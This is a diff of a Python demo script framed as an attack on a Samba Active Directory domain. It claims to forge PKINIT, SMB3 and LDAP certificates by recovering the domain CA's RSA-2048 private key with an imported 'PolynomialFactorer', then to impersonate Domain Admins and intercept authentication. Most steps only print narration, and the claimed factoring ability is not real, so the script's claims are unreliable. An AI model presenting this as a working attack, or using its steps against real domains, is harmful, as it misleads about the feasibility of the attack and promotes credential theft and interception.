@@ -4,8 +4,10 @@ Forge PKINIT certificates for any user (including Domain Admins), impersonate
 SMB3 file servers, and MitM all LDAP authentication.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 
@@ -19,7 +21,7 @@ def fetch_samba_domain_ca_cert(dc_host: str) -> bytes:
     print(f"[*] LDAP query to {dc_host}:")
     print("    ldapsearch -x -H ldap://{dc_host} -b 'CN=Configuration,DC=corp,DC=local'")
     print("[*] CA certificate retrieved (RSA-2048)")
-    return b"-----BEGIN CERTIFICATE-----\n...(Samba CA PEM)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_pkinit_cert(factorer: PolynomialFactorer,
@@ -31,7 +33,7 @@ def forge_pkinit_cert(factorer: PolynomialFactorer,
     smartcard logon (PKINIT). The CA is the Samba domain CA.
     Forge a cert -> get a Kerberos TGT as any user.
     """
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged PKINIT cert: CN={username}@{domain}")
     print("[*] no smartcard needed — cert-based Kerberos auth")
     return priv
@@ -52,7 +54,7 @@ def forge_smb3_server_cert(factorer: PolynomialFactorer,
     SMB over QUIC (Windows 11 / Server 2022 feature) uses TLS with
     the Samba server's RSA-2048 certificate from the domain CA.
     """
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged SMB3 TLS cert: CN={server_hostname}")
     print("[*] MitM every SMB3-over-TLS connection")
     print("[*] intercept files, harvest NTLM hashes on fallback")
@@ -67,7 +69,7 @@ def mitm_ldap(factorer: PolynomialFactorer,
     auth request, group membership lookup, and sudo policy query goes
     through LDAP TLS.
     """
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged LDAP TLS cert for {dc_host}")
     print("[*] intercepting: SSSD auth, group lookups, sudo policies")
     print("[*] every Linux host joined to the domain trusts this cert")
